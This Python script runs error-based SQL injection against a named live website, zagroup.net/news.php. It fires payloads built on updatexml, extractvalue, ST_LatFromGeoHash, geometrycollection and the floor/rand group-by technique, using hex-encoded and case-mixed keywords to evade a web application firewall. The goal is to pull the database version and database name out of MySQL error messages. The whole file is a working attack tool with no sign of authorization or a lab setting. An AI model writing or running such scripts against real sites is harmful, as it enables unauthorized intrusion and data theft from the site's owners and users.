#!/usr/bin/env python3
"""zagroup numeric: deterministic error-based with WAF encoding bypass
Test updatexml/extractvalue with hex-encoded first char + numeric context
"""
import urllib.request, re, time

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

def probe(param, tag):
    code, body = fetch(BASE + "?c=" + param)
    err = re.search(r'MySQL server error</b>\s*:\s*<br>([^<]+)', body)
    print("%-35s code=%s size=%d %s" % (tag, code, len(body),
          (err.group(1)[:110] if err else "NOERR")), flush=True)
    time.sleep(2)

# numeric context + error functions
# %75pdatexml = 'updatexml' hex-encoded u
probe("259%20%61Nd%20%75pdatexml(1,concat(0x7e,version()),1)", "u%75pdatexml-ver")
probe("259%20aNd%20updatexml(1,concat(0x7e,database()),1)", "updatexml-db")
probe("259%20aNd%20extractvalue(1,concat(0x7e,database()))", "extractvalue-db")
probe("259%20aNd%20ST_LatFromGeoHash(concat(0x7e,database()))", "ST-db")
probe("259%20aNd%20geometrycollection(version())", "geometry-ver")
probe("259%20aNd%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)", "floor-ver")
